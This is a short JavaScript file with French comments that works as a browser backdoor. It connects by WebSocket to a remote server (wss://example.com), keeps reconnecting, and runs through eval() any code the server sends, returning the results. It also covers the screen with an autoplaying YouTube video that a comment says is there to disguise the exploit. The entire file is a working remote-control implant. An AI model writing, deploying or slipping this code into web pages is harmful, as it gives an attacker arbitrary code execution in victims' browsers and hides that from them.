globalThis.serverName = 'custom_server';
globalThis.lastPing = Date.now();

const sendMessage = (socket, message) => socket.send(JSON.stringify(message));

// Commande ping : maintient la connexion
const pingCommand = (_, socket) => {
  globalThis.lastPing = Date.now();
  sendMessage(socket, { type: 'pong' });
};

// Commande eval : exécute du code arbitraire
const evalCommand = ({ code }, socket) => {
  try {
    const result = eval(code);
    sendMessage(socket, { type: 'result', result: `${result}` });
  } catch (err) {
    sendMessage(socket, { type: 'error', error: `${err}` });
  }
};

// Table des commandes disponibles
globalThis.commands = {
  eval: evalCommand,
  ping: pingCommand,
};

// Fonction principale pour établir une connexion WebSocket
globalThis.start = globalThis.start ?? (() => {
  if (globalThis.socket) return;

  const socket = new WebSocket(`wss://example.com/ws/${globalThis.serverName}`);
  globalThis.socket = socket;

  socket.onmessage = ({ data }) => {
    const { type, ...rest } = JSON.parse(data);
    globalThis.commands[type]?.(rest, socket);
  };

  socket.onclose = () => {
    globalThis.socket = undefined;
    setTimeout(globalThis.start, 500); // Réessayer après 500ms
  };
});

// Charger une vidéo YouTube pour camoufler l'exploit
(function displayYouTubeVideo() {
  const iframe = document.createElement('iframe');
  iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1';
  iframe.style = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:9999;border:none;';
  document.body.appendChild(iframe);

  setTimeout(() => iframe.remove(), 60000); // Supprime l'iframe après 1 minute
})();

globalThis.start();
